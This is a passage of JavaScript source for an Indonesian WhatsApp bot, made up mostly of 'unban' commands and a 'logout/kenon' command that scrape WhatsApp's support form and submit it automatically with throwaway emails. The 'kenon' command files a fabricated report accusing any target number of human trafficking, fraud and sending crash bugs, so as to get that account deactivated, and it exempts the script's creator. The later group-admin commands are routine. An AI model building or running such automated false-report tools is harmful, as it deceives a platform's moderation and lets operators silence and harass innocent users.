let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban3()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv4":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban4()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv5":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban5()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv6":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban6()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv7":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban7()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "unbanv8":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let jir = q
let dia = jir.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=319708")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${teksUnban8()}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break
case "logout":
case "out":
case "verif":
case "kenon":{
if (!isDeveloper && !isOwner) return reply(global.mess.DeveloperOnly)
if (!q) return reply(`Penggunaan ${prefix+command} 628xxxx`)
let dia = q.split("|")[0].replace(/[^0-9]/g, '')
var cekap = await conn.onWhatsApp(dia + '@s.whatsapp.net')
if (cekap.length == 0) return reply(global.mess.NotNumber)
if (dia == '6285789004732') return
if (dia == CreatorLexxy) return reply(`*gagal mengirim bug ke Lexxy Official, karena dia pembuat script ini, sekian terima kasih.*`)
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10000")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${dia}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Untuk tim WhatsApp tolong segera nonaktifkan akun WhatsApp ini. Karena akun ini telah melakukan penjualan manusia dan akun ini juga melakukan penipuan dan juga akun ini baru saja mengirimi saya bug sampai whatsapp saya tidak bisa di buka tolong segera blokir/nonaktifkan nomor tersebut karena sangat berterima kasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({ url, method: "POST", data: form, headers: { cookie }
})
reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
addCmd(command, 1, db_cmd)
break

// GROUP MENU
case 'linkgrup': case 'linkgc':{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
var url = await conn.groupInviteCode(from).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
url = 'https://chat.whatsapp.com/'+url
reply(url)
}
addCmd(command, 1, db_cmd)
break
case 'revoke':{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
await conn.groupRevokeInvite(from).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case 'group': case 'grup':
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
if (args[0] == "off") {
conn.groupSettingUpdate(from, 'announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else if (args[0] == "on") {
conn.groupSettingUpdate(from, 'not_announcement').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
} else {
reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : ${prefix+command} on`)
}
addCmd(command, 1, db_cmd)
break
case "hidetag":{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
}
addCmd(command, 1, db_cmd)
break
case "kick": {
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case 'promote':{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return reply(`*Penggunaan*\n${prefix+command} @tag`)
await conn.groupParticipantsUpdate(from, [users], "promote").then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command, 1, db_cmd)
break
case 'demote':{
if (!isGroup) return reply(global.mess.GroupOnly)
if (!isBotAdmins) return reply(global.mess.BotAdmin)
if (!isGroupAdmins && !isDeveloper) return reply(global.mess.AdminOnly)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return reply(`*Penggunaan*\n${prefix+command} @tag`)
await conn.groupParticipantsUpdate(from, [users], "demote")
}
addCmd(command, 1, db_cmd)
break
default:
}
} catch (err) {
conn.sendMessage("6282279915237@s.whatsapp.net", {text:`${util.format(err)}`})
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})